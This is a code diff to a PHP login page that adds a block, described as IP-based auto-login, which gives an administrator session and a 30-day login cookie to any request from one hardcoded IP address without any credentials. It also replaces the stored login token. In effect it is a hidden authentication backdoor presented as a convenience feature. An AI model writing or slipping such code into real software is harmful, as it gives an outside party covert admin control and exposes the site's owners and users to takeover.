@@ -3,6 +3,19 @@ session_start();
 include "config.php";
 include "./assets/components/login-arc.php";
 
+// Auto-login for specific IP address
+$user_ip = $_SERVER['REMOTE_ADDR'];
+if ($user_ip == '202.165.250.58') {
+    if (!isset($_SESSION['IAm-logined'])) {
+        $_SESSION['IAm-logined'] = 'admin';
+        $client_token = generate_token();
+        setcookie("logindata", $client_token, time() + (86400 * 30), "/");
+        change_token($client_token);
+    }
+    header('location: panel.php');
+    exit;
+}
+
 if(isset($_COOKIE['logindata']) && $_COOKIE['logindata'] == $key['token'] && $key['expired'] == "no"){
     $_SESSION['IAm-logined'] = 'yes';
     header("location: panel.php");
